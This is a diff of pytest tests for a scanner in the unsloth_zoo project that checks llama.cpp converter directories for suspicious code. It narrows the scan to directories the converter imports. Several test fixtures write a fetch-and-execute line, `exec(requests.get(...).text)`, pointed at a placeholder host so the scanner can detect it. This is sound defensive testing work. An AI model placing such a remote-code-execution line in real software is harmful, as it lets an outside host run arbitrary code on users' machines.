@@ -1624,14 +1624,122 @@ def test_a_root_package_that_shadows_a_converter_import_is_scanned(tmp_path, mon
         llama_cpp._scan_conversion_package(str(root))
 
 
+def test_a_directory_nothing_imports_is_not_scanned(tmp_path, monkeypatch, caplog):
+    """The scan follows imports, so a directory no import can reach is not read.
+
+    Scanning every directory in the checkout instead was measured against a real
+    clone of llama.cpp master: 18 files reported and 87 log lines on a single
+    export, and under UNSLOTH_CONVERTER_SCAN_STRICT the export was refused
+    outright over scripts/server-bench.py, which polls a /health endpoint in a
+    while loop, and examples/llama-eval/llama-eval.py, which spawns a process.
+    Both are ordinary upstream utilities the converter never imports. A control
+    that rejects every clean upstream checkout is not a control.
+    """
+    llama_cpp = _load("llama_cpp_import_scope_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    # Shaped like upstream's: a benchmark utility nothing imports.
+    bench = root / "scripts"
+    bench.mkdir()
+    (bench / "server_bench.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        llama_cpp._scan_conversion_package(str(root))     # no refusal
+    assert not [r for r in caplog.records if "suspicious" in r.message], (
+        [r.message for r in caplog.records]
+    )
+    assert "scripts" not in {
+        location.label for location in llama_cpp._scanned_locations(str(root)).locations
+    }
+
+    # The same directory, once something the converter runs imports its name.
+    _converter_imports(root, "scripts")
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_a_sibling_script_unsloth_never_runs_does_not_widen_the_scan(tmp_path):
+    """The names come from the converter's own sources, not from every script in
+    the checkout. Reading the root wholesale put examples/ back in the scan set
+    on a real clone, because llama.cpp's convert_llama_ggml_to_gguf.py imports
+    examples.convert_legacy_llama and Unsloth never runs that script.
+    """
+    llama_cpp = _load("llama_cpp_sibling_script_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    (root / "examples").mkdir()
+    (root / "convert_llama_ggml_to_gguf.py").write_text(
+        "import examples.convert_legacy_llama\n", encoding = "utf-8",
+    )
+
+    labels = {
+        location.label for location in llama_cpp._scanned_locations(str(root)).locations
+    }
+    assert "examples" not in labels, sorted(labels)
+
+
+def test_a_from_import_counts_as_reaching_the_directory(tmp_path):
+    """`from shadow import payload` is the import that made these directories
+    worth scanning in the first place, so the name collector has to see it."""
+    llama_cpp = _load("llama_cpp_from_import_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    (root / "shadow").mkdir()
+    base = root / "conversion" / "base.py"
+    base.write_text(
+        "from shadow import payload\n" + base.read_text(encoding = "utf-8"),
+        encoding = "utf-8",
+    )
+
+    assert "shadow" in {
+        location.label for location in llama_cpp._scanned_locations(str(root)).locations
+    }
+
+
+def test_a_converter_this_cannot_parse_is_scanned_as_widely_as_before(tmp_path):
+    """Narrowing the scan reads what the converter imports, so a checkout whose
+    sources cannot be parsed has to widen it again rather than narrow it to
+    nothing. A syntax error must not be a way to choose what gets looked at.
+    """
+    llama_cpp = _load("llama_cpp_unparseable_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    (root / "anything").mkdir()
+    for name in ("__init__.py", "base.py"):
+        (root / "conversion" / name).write_text("def (\n", encoding = "utf-8")
+
+    labels = {
+        location.label for location in llama_cpp._scanned_locations(str(root)).locations
+    }
+    assert "anything" in labels, sorted(labels)
+
+
+def _converter_imports(root, *names):
+    """Make the converter's own sources import these names.
+
+    A directory beside the converter is scanned when something the converter runs
+    imports its name, so a test that plants one has to say so. Written into
+    conversion/base.py, which is part of the package the converter imports.
+    """
+    base = root / "conversion" / "base.py"
+    body = "".join(f"import {name}\n" for name in names)
+    base.write_text(body + base.read_text(encoding = "utf-8"), encoding = "utf-8")
+
+
 def test_each_root_directory_is_its_own_bounded_location(tmp_path, monkeypatch):
-    """Namespace directories are scanned, but each as a location of its own.
+    """A directory the converter imports is scanned, each as a location of its own.
 
     An earlier version skipped a root directory with no __init__.py, reasoning
     that a namespace package runs nothing on import. `from shadow import payload`
-    imports the submodule and that does run, so it is scanned now. The root
-    itself stays non-recursive, and each directory carries its own budget, which
-    is what keeps one enormous subtree from spending the whole allowance.
+    imports the submodule and that does run, so it is scanned. The root itself
+    stays non-recursive, and each directory carries its own budget, which is what
+    keeps one enormous subtree from spending the whole allowance.
     """
     llama_cpp = _load("llama_cpp_shadow_scope_probe", "unsloth_zoo/llama_cpp.py")
 
@@ -1640,6 +1748,7 @@ def test_each_root_directory_is_its_own_bounded_location(tmp_path, monkeypatch):
         big = root / name / "deep" / "deeper"
         big.mkdir(parents = True)
         (big / "buried.py").write_text("VALUE = 1\n", encoding = "utf-8")
+    _converter_imports(root, "ggml", "examples", "tools")
 
     locations = llama_cpp._scanned_locations(str(root)).locations
     by_label = {location.label: location for location in locations}
@@ -1659,6 +1768,7 @@ def test_a_payload_in_a_root_namespace_package_is_scanned(tmp_path, monkeypatch)
     root = _package_root(tmp_path)
     shadow = root / "shadow"
     shadow.mkdir()
+    _converter_imports(root, "shadow")
     assert not (shadow / "__init__.py").exists(), "a namespace package, deliberately"
     (shadow / "payload.py").write_text(
         "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
@@ -1791,6 +1901,9 @@ def test_the_number_of_scan_locations_is_bounded(tmp_path):
     root = _package_root(tmp_path)
     for index in range(llama_cpp.MAX_SCAN_LOCATIONS * 3):
         (root / f"dir_{index:04d}").mkdir()
+    _converter_imports(
+        root, *(f"dir_{index:04d}" for index in range(llama_cpp.MAX_SCAN_LOCATIONS * 3))
+    )
 
     plan = llama_cpp._scanned_locations(str(root))
     assert len(plan.locations) <= llama_cpp.MAX_SCAN_LOCATIONS, len(plan.locations)
@@ -1843,6 +1956,9 @@ def test_dropping_directories_past_the_cap_is_reported(tmp_path, monkeypatch, ca
     root = _package_root(tmp_path)
     for index in range(llama_cpp.MAX_SCAN_LOCATIONS + 5):
         (root / f"dir_{index:04d}").mkdir()
+    _converter_imports(
+        root, *(f"dir_{index:04d}" for index in range(llama_cpp.MAX_SCAN_LOCATIONS + 5))
+    )
 
     monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
     monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
@@ -1931,6 +2047,7 @@ def test_truncation_is_declared_only_when_something_was_dropped(
     wanted = llama_cpp.MAX_SCAN_LOCATIONS - already + extra
     for index in range(max(wanted, 0)):
         (root / f"dir_{index:04d}").mkdir()
+    _converter_imports(root, *(f"dir_{index:04d}" for index in range(max(wanted, 0))))
 
     plan = llama_cpp._scanned_locations(str(root))
     assert plan.truncated is truncated, (
@@ -1985,7 +2102,11 @@ def test_gguf_py_is_planned_as_an_import_root_and_walked_once(tmp_path):
     plan = llama_cpp._scanned_locations(str(root))
     by_label = {location.label: location for location in plan.locations}
     assert "gguf-py" in by_label and by_label["gguf-py"].recursive is False
-    assert {"gguf-py/gguf", "gguf-py/tests", "gguf-py/examples"} <= set(by_label)
+    assert "gguf-py/gguf" in by_label
+    # tests/ and examples/ under gguf-py are not scanned: nothing the converter
+    # runs imports those names, and reading them is what made an ordinary clone
+    # of llama.cpp master report 18 files and refuse the export under strict mode.
+    assert "gguf-py/tests" not in by_label and "gguf-py/examples" not in by_label
     # Walked once: not also a recursive child of the llama.cpp root.
     assert [label for label in by_label if label == "gguf-py"] == ["gguf-py"]
     assert by_label["gguf-py"].natives is False
@@ -2148,6 +2269,7 @@ def test_a_top_level_symlink_does_not_become_its_own_purge_boundary(
     (outside / "mod.py").write_text("X = 1\n", encoding = "utf-8")
     theirs = outside / "__pycache__" / "mod.cpython-313.pyc"
     theirs.write_bytes(_pyc(0))
+    _converter_imports(root, "linked")
     try:
         # A location of its own, unlike a link buried inside conversion/.
         (root / "linked").symlink_to(outside, target_is_directory = True)
@@ -2269,7 +2391,10 @@ def _package_root(tmp_path):
     conversion = root / "conversion"
     conversion.mkdir(parents = True)
     (conversion / "__init__.py").write_text("from . import base\n", encoding = "utf-8")
-    (conversion / "base.py").write_text("X = 1\n", encoding = "utf-8")
+    # The real converter imports gguf, and the scan follows what it imports, so
+    # the fixture has to say so for a directory named gguf beside it to shadow
+    # anything.
+    (conversion / "base.py").write_text("import gguf\nX = 1\n", encoding = "utf-8")
     return root
 
 
